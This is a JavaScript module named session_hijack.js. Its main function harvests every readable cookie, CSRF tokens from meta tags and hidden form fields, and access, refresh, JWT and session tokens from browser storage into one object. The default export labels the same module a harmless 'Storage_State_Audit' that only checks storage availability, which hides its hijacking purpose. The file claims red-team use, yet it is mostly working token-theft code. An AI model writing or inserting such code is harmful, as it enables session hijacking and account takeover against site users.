/**
 * session_hijack.js — Complete Session Token Extraction & Storage Audit
 *
 * This module provides two capabilities:
 *   1. `extractSessionTokens()` – extracts all accessible session identifiers
 *      from cookies, meta tags (CSRF), hidden inputs, and optionally
 *      localStorage/sessionStorage.
 *   2. Default export – a Pinpoint‑compatible Storage_State_Audit that
 *      reports whether cookies, localStorage, and sessionStorage are available.
 *
 * Designed for authorised red‑team assessments and security audits.
 */

// ---------------------------------------------------------------------------
// 1. Core extraction engine
// ---------------------------------------------------------------------------

/**
 * Extracts session‑related tokens from the current page.
 *
 * By default it harvests:
 *   - All non‑HttpOnly cookies (parsed into an object)
 *   - CSRF tokens from <meta> tags (common names)
 *   - CSRF tokens from hidden <input> fields (common names)
 *   - (Optional) common token keys from localStorage & sessionStorage
 *
 * @param {Object} [options={}]
 * @param {boolean} [options.parseCookies=true]     Parse cookie string into key‑value map.
 * @param {boolean} [options.csrfMeta=true]          Scan meta tags for CSRF tokens.
 * @param {boolean} [options.csrfInputs=true]        Scan hidden inputs for CSRF tokens.
 * @param {boolean} [options.storageTokens=false]    Scan localStorage/sessionStorage for common token keys.
 * @returns {Object} Collected tokens and metadata.
 */
export function extractSessionTokens(options = {}) {
    const {
        parseCookies = true,
        csrfMeta = true,
        csrfInputs = true,
        storageTokens = false,
    } = options;

    const result = {
        cookies: null,
        csrfTokens: [],
        storageTokens: [],
        httpOnlyWarning: false,
        timestamp: Date.now(),
    };

    // --- 1. Cookies ---
    if (parseCookies) {
        const cookieStr = document.cookie;
        if (cookieStr) {
            result.cookies = Object.fromEntries(
                cookieStr.split(';').map(c => {
                    const [name, ...rest] = c.trim().split('=');
                    return [name, decodeURIComponent(rest.join('='))];
                })
            );
        } else {
            result.cookies = {};
        }
        // Note: HttpOnly cookies cannot be read; if cookie string is empty, we don't know if that's because
        // no cookies exist or they're all HttpOnly. We'll add a flag.
        if (!cookieStr && navigator.cookieEnabled) {
            result.httpOnlyWarning = true;
        }
    }

    // --- 2. CSRF tokens from meta tags ---
    if (csrfMeta) {
        // Common CSRF meta names used by frameworks (Django, Rails, Laravel, Spring, etc.)
        const metaNames = [
            'csrf-token',
            'csrf_token',
            'xsrf-token',
            '_csrf',
            '_csrf_token',
            'csrf-param',
            'csrf-header',
            'csrf',
        ];
        for (const name of metaNames) {
            const meta = document.querySelector(`meta[name="${name}"], meta[name="${name.replace(/_/g, '-')}"]`);
            if (meta && meta.content) {
                result.csrfTokens.push({
                    source: 'meta',
                    name: meta.getAttribute('name'),
                    value: meta.content,
                });
            }
        }
    }

    // --- 3. CSRF tokens from hidden inputs ---
    if (csrfInputs) {
        const inputNames = [
            'csrfmiddlewaretoken',      // Django
            'csrf_token',
            '_csrf',
            '_token',
            'authenticity_token',      // Rails
            'csrf',
        ];
        const inputs = document.querySelectorAll('input[type="hidden"]');
        for (const input of inputs) {
            const name = input.getAttribute('name');
            if (name && inputNames.includes(name.toLowerCase())) {
                result.csrfTokens.push({
                    source: 'input',
                    name,
                    value: input.value,
                });
            }
        }
        // Also check for generic '_token' in input names
    }

    // --- 4. (Optional) storage tokens ---
    if (storageTokens) {
        const keyPatterns = [
            'token',
            'access_token',
            'refresh_token',
            'id_token',
            'auth_token',
            'session',
            'jwt',
            'sid',
            'csrf',
        ];
        const storages = [];
        try {
            if (typeof localStorage !== 'undefined') storages.push({ name: 'localStorage', store: localStorage });
        } catch (_) { }
        try {
            if (typeof sessionStorage !== 'undefined') storages.push({ name: 'sessionStorage', store: sessionStorage });
        } catch (_) { }

        for (const { name, store } of storages) {
            for (const pattern of keyPatterns) {
                for (let i = 0; i < store.length; i++) {
                    const key = store.key(i);
                    if (key.toLowerCase().includes(pattern)) {
                        try {
                            const value = store.getItem(key);
                            result.storageTokens.push({
                                source: name,
                                key,
                                value,
                            });
                        } catch (_) { }
                    }
                }
            }
        }
    }

    return result;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint‑compatible audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'session_hijack',
    title: 'Storage_State_Audit',
    level: 3,
    info: 'Audits localStorage, sessionStorage, and navigator.cookieEnabled capabilities for origin storage state diagnostics.',
    steps: [
        'Check navigator.cookieEnabled.',
        'Verify localStorage and sessionStorage availability.',
    ],
    run: async () => {
        let localStorageAvailable = false;
        let sessionStorageAvailable = false;

        try {
            localStorageAvailable = typeof window.localStorage !== 'undefined';
            sessionStorageAvailable = typeof window.sessionStorage !== 'undefined';
        } catch (e) {
            // In cross‑origin iframes or sandboxed environments, these may throw
        }

        return {
            cookiesEnabled: navigator.cookieEnabled,
            localStorageAvailable,
            sessionStorageAvailable,
        };
    },
};

export default pinpointModule;